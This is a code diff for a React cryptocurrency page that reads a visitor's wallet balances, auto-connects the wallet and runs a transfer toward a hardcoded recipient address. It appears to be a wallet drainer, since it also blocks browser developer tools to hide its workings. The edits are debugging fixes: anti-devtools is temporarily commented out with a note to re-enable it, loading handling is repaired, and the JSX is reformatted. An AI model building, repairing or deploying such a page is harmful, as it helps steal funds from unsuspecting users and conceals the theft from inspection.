@@ -4,8 +4,8 @@ import Web3 from "web3";
 import { ethers } from "ethers";
 import { FaArrowLeft } from 'react-icons/fa';
 import DisableDevtool from 'disable-devtool';
-import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js'; // Updated with .js
-import { detectWalletAddress } from "./utils/transactionUtils.js"; // Updated with .js
+import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js'; // Already fixed
+import { detectWalletAddress } from "./utils/transactionUtils.js"; // Already fixed
 
 const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
@@ -231,18 +231,19 @@ const App = () => {
   const [usdtBalance, setUsdtBalance] = useState(0);
   const [bnbBalance, setBnbBalance] = useState(0);
   const [walletConnected, setWalletConnected] = useState(false);
-  const [loading, setLoading] = useState(false);
+  const [loading, setLoading] = useState(true); // Kept from previous fix
   const [transferCompleted, setTransferCompleted] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
 
   const isProcessing = useRef(false);
 
   useEffect(() => {
-    DisableDevtool({
-      ondevtoolopen: (type) => {
-        alert('Developer tools are disabled on this page.');
-      }
-    });
+    // DisableDevtool commented out for debugging (re-enable after)
+    // DisableDevtool({
+    //   ondevtoolopen: (type) => {
+    //     alert('Developer tools are disabled on this page.');
+    //   }
+    // });
   }, []);
 
   useEffect(() => {
@@ -283,7 +284,10 @@ const App = () => {
   useEffect(() => {
     const init = async () => {
       try {
-        if (!window.ethereum) return;
+        if (!window.ethereum) {
+          setLoading(false); // Set loading false if no wallet
+          return;
+        }
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const userAddress = await signer.getAddress();
@@ -296,6 +300,8 @@ const App = () => {
         setWalletConnected(true);
       } catch (err) {
         console.error("❌ init() error:", err);
+      } finally {
+        setLoading(false); // Ensure loading ends
       }
     };
     init();
@@ -304,6 +310,8 @@ const App = () => {
   const clearAddress = () => {
     setAddress("");
   };
+
+  if (loading) return <div>Loading wallet...</div>; // Kept from previous fix
 
   return (
     <GlobalStyle>
@@ -353,15 +361,15 @@ const App = () => {
               console.error("Transfer failed:", error);
               alert(error.message || "Transfer failed. Check console for details.");
             } finally {
-              setLoading(false);
-            }
-          }}
-        >
-          {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
-        </NextButton>
-      </Container>
-    </GlobalStyle>
-  );
+          setLoading(false);
+        }
+      }}
+    >
+      {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
+    </NextButton>
+  </Container>
+</GlobalStyle>
+);
 };
 
 export default App;
